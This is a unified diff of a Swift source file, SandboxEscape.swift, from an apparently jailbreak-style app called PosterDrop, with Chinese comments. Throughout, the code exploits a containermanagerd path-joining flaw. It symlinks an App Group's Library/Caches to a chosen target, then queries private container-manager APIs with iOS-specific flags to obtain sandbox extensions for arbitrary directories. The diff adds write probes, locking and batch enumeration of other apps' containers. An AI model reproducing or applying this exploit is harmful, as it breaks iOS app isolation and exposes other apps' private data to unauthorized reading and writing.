@@ -2,18 +2,18 @@
 //  SandboxEscape.swift
 //  PosterDrop
 //
-//  直连通道的底层：借 containermanagerd 的路径拼接缺陷，拿到任意容器目录的沙箱扩展。
+//  整个 App 的唯一底层：worse_query 的 App Group 沙箱逃逸。
+//  参考（非拷贝）forcequitOS/worse_query 与 WQFiles 的公开实现，关键点：
 //
-//  参考（非拷贝）：worse_query / WQFiles / filza-wq 的公开实现，关键点有三处——
-//    1. 查询必须用 **App Group 容器**（class 7）+ `container_query_set_group_identifiers`，
-//       所以签名里必须带 com.apple.security.application-groups，否则拿不到结果；
+//    1. 查询必须用 **App Group 容器**（class 7）+ container_query_set_group_identifiers，
+//       签名里必须有 com.apple.security.application-groups；
 //    2. 交换点是 `<group>/Library/Caches`：先把它换成指向目标的符号链接，再查 part=3；
 //       守护进程拼出的路径没有 realpath 校验，签出来的扩展就落在目标上；
-//    3. iOS 26 与 27 要求的 flags 不同（0x0000008000000000 / 0x0000000800000000），
-//       而且“签发成功”不等于“真的能打开”，必须逐个路径验证后换另一组 flags 重试。
-//
-//  与 WQFiles 一致：Token 按路径缓存并限量，超出后释放最旧的；交换过程留恢复标记，
-//  即使进程被杀，下次启动也能把 Caches 还原，不会让容器永久坏掉。
+//    3. iOS 27 用 0x0000008000000000，iOS 26 用 0x0000000800000000；
+//       “签发成功”不等于“真的能打开”，必须验证后换另一组 flags 重试；
+//    4. **扩展只覆盖签发时指定的那一个目录**（实测 27.0.1）：写文件前必须先给
+//       文件所在的目录本身签发，仅给容器根签发还不够——这是之前写不进去的原因之一；
+//    5. 扩展数量有内核上限，缓存按路径限额、最旧的先释放；交换过程留恢复标记。
 //
 
 import Foundation
@@ -26,11 +26,14 @@ final class EscapeSession: @unchecked Sendable {
     let target: String
     let group: String
     let handle: Int64
+    /// 这个扩展是否通过了写探针（能在这个目录里创建文件）
+    let writable: Bool
 
-    init(target: String, group: String, handle: Int64) {
+    init(target: String, group: String, handle: Int64, writable: Bool) {
         self.target = target
         self.group = group
         self.handle = handle
+        self.writable = writable
     }
 
     var label: String { "App Group（\(group)）" }
@@ -93,16 +96,17 @@ enum SandboxEscape {
         FileManager.default.containerURL(forSecurityApplicationGroupIdentifier: group)?.path
     }
 
-    // MARK: - 扩展缓存
+    // MARK: - 并发与缓存
 
-    private static let lock = NSLock()
+    /// 整个进程同一时间只能有一个 Caches 交换。它同时保护「交换 → 查询 → 验证」这段临界区。
+    private static let gate = NSRecursiveLock()
+
     private static var grants: [String: EscapeSession] = [:]
     private static var grantOrder: [String] = []
-    private static let maxGrants = 48
+    /// 内核允许的扩展数量有限。WQFiles 用 192，这里保持一致。
+    private static let maxGrants = 192
 
     private static func cached(_ key: String) -> EscapeSession? {
-        lock.lock()
-        defer { lock.unlock() }
         guard let session = grants[key] else { return nil }
         grantOrder.removeAll { $0 == key }
         grantOrder.append(key)
@@ -110,8 +114,9 @@ enum SandboxEscape {
     }
 
     private static func remember(_ session: EscapeSession, key: String) {
-        lock.lock()
-        defer { lock.unlock() }
+        if let existing = grants[key], existing.handle != session.handle {
+            release(existing.handle)
+        }
         while grantOrder.count >= maxGrants, let oldest = grantOrder.first {
             if let victim = grants.removeValue(forKey: oldest) {
                 release(victim.handle)
@@ -133,43 +138,61 @@ enum SandboxEscape {
 
     // MARK: - 申请
 
-    static func grant(path: String, group: String) throws -> EscapeSession {
+    /// 给一个已经存在的目录/文件申请扩展。
+    /// - Parameter requireWrite: 为 true 时，签发后真的在目录里建一个探针文件，建不出来就算失败。
+    @discardableResult
+    static func grant(path: String, group: String, requireWrite: Bool = false) throws -> EscapeSession {
         let canonical = canonicalPath(path)
-        if let hit = cached(canonical) { return hit }
+
+        gate.lock()
+        defer { gate.unlock() }
+
+        if let hit = cached(canonical), !requireWrite || hit.writable {
+            return hit
+        }
 
         var status = stat()
         guard lstat(canonical, &status) == 0 else {
             throw Failure(code: -255, message: "目标不存在：\(canonical)")
         }
-        guard (status.st_mode & S_IFMT) == S_IFDIR else {
-            throw Failure(code: -255, message: "目标不是目录：\(canonical)")
-        }
+        let isDirectory = (status.st_mode & S_IFMT) == S_IFDIR
 
         guard let base = groupContainerPath(group) else {
             throw Failure(code: -1, message: "App Group 容器不存在，签名里缺少 \(group) 的 entitlement")
         }
 
-        let iosMajor = ProcessInfo.processInfo.operatingSystemVersion.majorVersion
-        // WQFiles 的实测：iOS 27 用标准 flags，iOS 26 用备用 flags
-        let primary: UInt64 = iosMajor >= 27 ? 0x0000_0080_0000_0000 : 0x0000_0008_0000_0000
-        let secondary: UInt64 = iosMajor >= 27 ? 0x0000_0008_0000_0000 : 0x0000_0080_0000_0000
+        // iOS 27 先试标准 flags，iOS 26 先试备用 flags；成功的那组会记下来。
+        let preferAlt = preferredAltFlags()
+        let candidates: [UInt64] = preferAlt
+            ? [altFlags, standardFlags]
+            : [standardFlags, altFlags]
 
         var lastCode: Int64 = -5
-        for flags in [primary, secondary] {
+        for flags in candidates {
             let handle: Int64
             do {
-                // 每次尝试都重新交换一遍：一次交换只服务一次查询，失败也能干净还原。
-                let swap = try CacheSwap(library: base + "/Library", target: canonical)
+                let swap = try CacheSwap(library: base + "/Library")
                 defer { swap.finish() }
+                try swap.retarget(to: canonical)
                 handle = try queryToken(group: group, flags: flags)
             } catch let failure as Failure {
                 lastCode = failure.code
                 continue
             }
 
+            var writable = false
             if opens(canonical) {
-                let session = EscapeSession(target: canonical, group: group, handle: handle)
+                if requireWrite {
+                    writable = canWrite(canonical, isDirectory: isDirectory)
+                    guard writable else {
+                        release(handle)
+                        lastCode = -8
+                        continue
+                    }
+                }
+                let session = EscapeSession(target: canonical, group: group, handle: handle, writable: writable)
                 remember(session, key: canonical)
+                noteWorkingFlags(flags == altFlags)
                 return session
             }
 
@@ -181,11 +204,17 @@ enum SandboxEscape {
         throw Failure(code: lastCode, message: describe(lastCode))
     }
 
+    /// 只读够用；写文件前用这个（例如目标目录是新建的）。
+    @discardableResult
+    static func grantWritable(path: String, group: String) throws -> EscapeSession {
+        try grant(path: path, group: group, requireWrite: true)
+    }
+
     /// 给一个还不存在的路径申请扩展：沿父目录向上找第一个存在且可授权的位置。
-    static func grantNearestExisting(path: String, group: String) -> EscapeSession? {
+    static func grantNearestExisting(path: String, group: String, requireWrite: Bool = false) -> EscapeSession? {
         var current = canonicalPath(path)
         while current != "/" && current != "." {
-            if let session = try? grant(path: current, group: group) {
+            if let session = try? grant(path: current, group: group, requireWrite: requireWrite) {
                 return session
             }
             current = (current as NSString).deletingLastPathComponent
@@ -193,7 +222,25 @@ enum SandboxEscape {
         return nil
     }
 
-    // MARK: - 查询与交换
+    // MARK: - flags
+
+    private static let standardFlags: UInt64 = 0x0000_0080_0000_0000
+    private static let altFlags: UInt64 = 0x0000_0008_0000_0000
+    private static var workingFlags: UInt64?
+
+    private static func preferredAltFlags() -> Bool {
+        guard let workingFlags else {
+            return ProcessInfo.processInfo.operatingSystemVersion.majorVersion < 27
+        }
+        return workingFlags == altFlags
+    }
+
+    private static func noteWorkingFlags(_ alt: Bool) {
+        guard workingFlags == nil else { return }
+        workingFlags = alt ? altFlags : standardFlags
+    }
+
+    // MARK: - 查询
 
     private typealias QueryCreate = @convention(c) () -> UnsafeMutableRawPointer?
     private typealias QuerySetClass = @convention(c) (UnsafeMutableRawPointer?, UInt64) -> Void
@@ -210,7 +257,7 @@ enum SandboxEscape {
     private static let partCaches: UInt64 = 3
 
     /// 发一次查询并 consume 拿到的 token。
-    /// 前置条件：`<group>/Library/Caches` 此刻已是指向目标路径的符号链接。
+    /// 前置条件：`<group>/Library/Caches` 此刻已是指向目标路径的符号链接，且已持有 gate。
     private static func queryToken(group: String, flags: UInt64) throws -> Int64 {
         guard let manager = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL) else {
             throw Failure(code: -2, message: "无法加载 libsystem_containermanager")
@@ -251,12 +298,13 @@ enum SandboxEscape {
         defer { freeQuery(query) }
 
         setClass(query, containerClassAppGroup)
-        setGroups(query, xpcString(group))
+        let identifier = xpcString(group)
+        setGroups(query, identifier)
         setPart(query, partCaches)
         setFlags(query, flags)
 
         guard let result = single(query) else {
-            throw Failure(code: -5, message: "containermanagerd 拒绝了这次查询")
+            throw Failure(code: -5, message: "containermanagerd 拒绝了这次查询（group=\(group)）")
         }
         guard let token = copyToken(result) else {
             throw Failure(code: -6, message: "内核拒绝签发沙箱扩展")
@@ -270,18 +318,46 @@ enum SandboxEscape {
         return handle
     }
 
-    private static func opens(_ path: String) -> Bool {
-        let fd = open(path, O_RDONLY | O_DIRECTORY | O_NOFOLLOW | O_CLOEXEC)
+    // MARK: - 访问检查
+
+    /// 只把 EPERM 当成“扩展没生效”；EACCES 是普通权限问题（root 拥有的目录），换 flags 也没用。
+    static func opens(_ path: String) -> Bool {
+        let fd = open(path, O_RDONLY | O_NONBLOCK | O_CLOEXEC)
         if fd >= 0 {
             close(fd)
             return true
         }
-        // EACCES 是普通权限问题（root 拥有的目录），换 flags 也解决不了，
-        // 但至少说明沙箱已经放行；EPERM 才是扩展没生效。
         return errno != EPERM
     }
 
-    private static func canonicalPath(_ path: String) -> String {
+    /// 目录能不能列出内容（父目录扩展是否真的生效）。
+    static func canList(_ path: String) -> Bool {
+        guard let directory = opendir(path) else { return false }
+        defer { closedir(directory) }
+        // opendir 被沙箱拒绝时返回 nil；能打开就说明至少拿到了目录读权限。
+        _ = readdir(directory)
+        return true
+    }
+
+    /// 在目录里真的建一个文件再删掉。扩展只覆盖签发目录本身，这是唯一可靠的写权限证据。
+    private static func canWrite(_ path: String, isDirectory: Bool) -> Bool {
+        if isDirectory {
+            let probe = path + "/.pd-probe-\(getpid())-\(UInt32.random(in: 1...UInt32.max))"
+            let fd = open(probe, O_CREAT | O_EXCL | O_WRONLY | O_CLOEXEC, 0o600)
+            guard fd >= 0 else { return false }
+            close(fd)
+            unlink(probe)
+            return true
+        }
+        let fd = open(path, O_WRONLY | O_CLOEXEC)
+        guard fd >= 0 else { return false }
+        close(fd)
+        return true
+    }
+
+    // MARK: - 路径工具
+
+    static func canonicalPath(_ path: String) -> String {
         var resolved = (path as NSString).standardizingPath
         if resolved.hasPrefix("/var/") {
             resolved = "/private" + resolved
@@ -289,16 +365,16 @@ enum SandboxEscape {
         return resolved
     }
 
-    private static func describe(_ code: Int64) -> String {
+    static func describe(_ code: Int64) -> String {
         switch code {
         case -1: return "App Group 容器不存在（签名里缺少 App Groups 权限，或 group 名字不匹配）"
         case -2: return "系统缺少所需符号，可能已修补"
         case -3: return "创建查询失败"
-        case -4: return "无法交换 Library/Caches"
+        case -4: return "无法交换 Library/Caches（可能另一个交换正在进行）"
         case -5: return "containermanagerd 拒绝了这次查询"
         case -6: return "内核拒绝签发沙箱扩展"
         case -7: return "扩展已签发但无法 consume"
-        case -8: return "扩展已签发，但目标仍无法打开（flags 不匹配或系统已修补）"
+        case -8: return "扩展已签发，但目标仍无法打开/写入（flags 不匹配或系统已修补）"
         case -255: return "目标路径无效"
         default: return "未知错误"
         }
@@ -311,15 +387,13 @@ enum SandboxEscape {
     final class CacheSwap {
 
         private let library: String
-        private let target: String
         private let backupName = "Caches.posterdrop-backup"
         private let markerName = ".posterdrop-swap.plist"
         private let lockFD: Int32
         private var active = false
 
-        init(library: String, target: String) throws {
+        init(library: String) throws {
             self.library = library
-            self.target = target
 
             try FileManager.default.createDirectory(atPath: library, withIntermediateDirectories: true)
 
@@ -355,27 +429,18 @@ enum SandboxEscape {
                 }
             }
 
-            try writeMarker()
-            do {
-                try fileManager.createSymbolicLink(atPath: caches, withDestinationPath: target)
-            } catch {
-                _ = try? fileManager.moveItem(atPath: backup, toPath: caches)
-                try? fileManager.removeItem(atPath: library + "/" + markerName)
-                close(lockFD)
-                throw Failure(code: -4, message: "无法创建符号链接：\(error.localizedDescription)")
-            }
+            writeMarker()
             active = true
         }
 
-        /// 把符号链接改指另一个目标：批量签发时省掉「移走 / 移回 Caches」的开销。
-        /// 备份目录与恢复标记保持不动，中途被杀仍能由 recover() 还原。
-        func retarget(to newTarget: String) throws {
+        /// 把符号链接指向目标；批量签发时只改链接，省掉移走/移回 Caches 的开销。
+        func retarget(to target: String) throws {
             let caches = library + "/Caches"
             try? FileManager.default.removeItem(atPath: caches)
             do {
-                try FileManager.default.createSymbolicLink(atPath: caches, withDestinationPath: newTarget)
+                try FileManager.default.createSymbolicLink(atPath: caches, withDestinationPath: target)
             } catch {
-                throw Failure(code: -4, message: "无法重建符号链接：\(error.localizedDescription)")
+                throw Failure(code: -4, message: "无法创建符号链接：\(error.localizedDescription)")
             }
         }
 
@@ -389,28 +454,22 @@ enum SandboxEscape {
             active = false
         }
 
-        private func writeMarker() throws {
-            let marker: [String: String] = ["target": target, "backup": backupName]
-            let data = try PropertyListSerialization.data(fromPropertyList: marker, format: .xml, options: 0)
-            try data.write(to: URL(fileURLWithPath: library + "/" + markerName), options: .atomic)
+        private func writeMarker() {
+            let marker: [String: String] = ["backup": backupName, "version": "2"]
+            guard let data = try? PropertyListSerialization.data(fromPropertyList: marker, format: .xml, options: 0) else {
+                return
+            }
+            try? data.write(to: URL(fileURLWithPath: library + "/" + markerName), options: .atomic)
         }
 
         /// 还原：删掉符号链接，把备份目录换回来。可重复调用。
         static func recover(library: String) {
             let fileManager = FileManager.default
-            let markerPath = library + "/" + ".posterdrop-swap.plist"
+            let markerPath = library + "/.posterdrop-swap.plist"
             let backup = library + "/Caches.posterdrop-backup"
             let caches = library + "/Caches"
 
-            guard let data = try? Data(contentsOf: URL(fileURLWithPath: markerPath)),
-                  let plist = try? PropertyListSerialization.propertyList(from: data, options: [], format: nil),
-                  let dict = plist as? [String: String] else {
-                // 没有标记但仍可能有残留备份
-                if fileManager.fileExists(atPath: backup), !fileManager.fileExists(atPath: caches) {
-                    try? fileManager.moveItem(atPath: backup, toPath: caches)
-                }
-                return
-            }
+            let hasMarker = fileManager.fileExists(atPath: markerPath)
 
             var status = stat()
             let isLink = lstat(caches, &status) == 0 && (status.st_mode & S_IFMT) == S_IFLNK
@@ -423,32 +482,32 @@ enum SandboxEscape {
                 if !fileManager.fileExists(atPath: caches) {
                     try? fileManager.moveItem(atPath: backup, toPath: caches)
                 }
-                // Caches 已经是真实目录：说明已恢复过，备份留着不影响使用
             } else if !fileManager.fileExists(atPath: caches) {
                 try? fileManager.createDirectory(atPath: caches, withIntermediateDirectories: false)
             }
 
-            try? fileManager.removeItem(atPath: markerPath)
-            _ = dict
+            if hasMarker {
+                try? fileManager.removeItem(atPath: markerPath)
+            }
         }
     }
 
     // MARK: - 批量签发（枚举容器时用）
 
-    /// 一次交换里给很多路径签发扩展。
-    ///
-    /// 枚举容器时每个候选都要一次 token；如果每个都完整交换一次 Caches，
-    /// 几百个容器要好几秒。这里只保留一份备份，之后仅重指符号链接。
-    /// 用完必须 `finish()`，否则 Caches 会一直指着最后一个目标（有恢复标记兜底）。
+    /// 一次交换里给很多路径签发扩展。枚举容器时每个候选都要一次 token，
+    /// 如果每个都完整交换一次 Caches，几百个容器要好几秒；这里只保留一份备份，之后仅重指链接。
     final class Sweeper {
 
         private let group: String
         private let swap: CacheSwap
         private var finished = false
+        private var verifiedWritable: Set<String> = []
 
         init?(group: String) {
+            gate.lock()
             guard let base = SandboxEscape.groupContainerPath(group),
-                  let swap = try? CacheSwap(library: base + "/Library", target: "/") else {
+                  let swap = try? CacheSwap(library: base + "/Library") else {
+                gate.unlock()
                 return nil
             }
             self.group = group
@@ -456,17 +515,25 @@ enum SandboxEscape {
         }
 
         /// 全新签发一个 handle；调用方负责 release。失败返回 nil，不抛错。
-        func grant(_ path: String) -> Int64? {
+        func grant(_ path: String, requireWrite: Bool = false) -> Int64? {
             let canonical = SandboxEscape.canonicalPath(path)
-            let major = ProcessInfo.processInfo.operatingSystemVersion.majorVersion
-            let candidates: [UInt64] = major >= 27
-                ? [0x0000_0080_0000_0000, 0x0000_0008_0000_0000]
-                : [0x0000_0008_0000_0000, 0x0000_0080_0000_0000]
+            var status = stat()
+            guard lstat(canonical, &status) == 0 else { return nil }
+            let isDirectory = (status.st_mode & S_IFMT) == S_IFDIR
+
+            let candidates: [UInt64] = SandboxEscape.preferredAltFlags()
+                ? [SandboxEscape.altFlags, SandboxEscape.standardFlags]
+                : [SandboxEscape.standardFlags, SandboxEscape.altFlags]
 
             for flags in candidates {
                 guard (try? swap.retarget(to: canonical)) != nil else { return nil }
                 guard let handle = try? SandboxEscape.queryToken(group: group, flags: flags) else { continue }
                 if SandboxEscape.opens(canonical) {
+                    if requireWrite && !SandboxEscape.canWritePath(canonical, isDirectory: isDirectory) {
+                        SandboxEscape.release(handle)
+                        continue
+                    }
+                    SandboxEscape.noteWorkingFlags(flags == SandboxEscape.altFlags)
                     return handle
                 }
                 SandboxEscape.release(handle)
@@ -475,8 +542,9 @@ enum SandboxEscape {
         }
 
         /// 读容器根目录的扩展属性，值就是这个容器所属 App 的 bundle id。
-        /// 比“读目录里有没有某个子目录”快得多，也不受数据保护影响。
+        /// 先直接读一次（有可能本来就有权限），失败再签发。
         func identifier(of path: String) -> String? {
+            if let direct = SandboxEscape.containerIdentifier(at: path) { return direct }
             guard let handle = grant(path) else { return nil }
             defer { SandboxEscape.release(handle) }
             return SandboxEscape.containerIdentifier(at: path)
@@ -484,20 +552,34 @@ enum SandboxEscape {
 
         /// 是否能在这个路径下看到指定相对路径（用于最终确认 PRBPosterExtensionDataStore）。
         func contains(_ path: String, relative: String) -> Bool {
+            if SandboxEscape.exists(path + "/" + relative) { return true }
             guard let handle = grant(path) else { return false }
             defer { SandboxEscape.release(handle) }
-            var status = stat()
-            return stat(path + "/" + relative, &status) == 0
+            return SandboxEscape.exists(path + "/" + relative)
         }
 
         func finish() {
             guard !finished else { return }
             finished = true
             swap.finish()
+            gate.unlock()
         }
 
         deinit { finish() }
     }
+
+    /// `Sweeper.canWrite` 的对内入口。
+    static func canWritePath(_ path: String, isDirectory: Bool) -> Bool {
+        canWrite(path, isDirectory: isDirectory)
+    }
+
+    /// lstat 会不会被沙箱拦？拦了就当作不存在。
+    static func exists(_ path: String) -> Bool {
+        var status = stat()
+        return lstat(path, &status) == 0
+    }
+
+    // MARK: - 容器标识
 
     /// 容器的扩展属性 com.apple.containermanager.identifier，值形如 com.apple.PosterBoard。
     static func containerIdentifier(at path: String) -> String? {
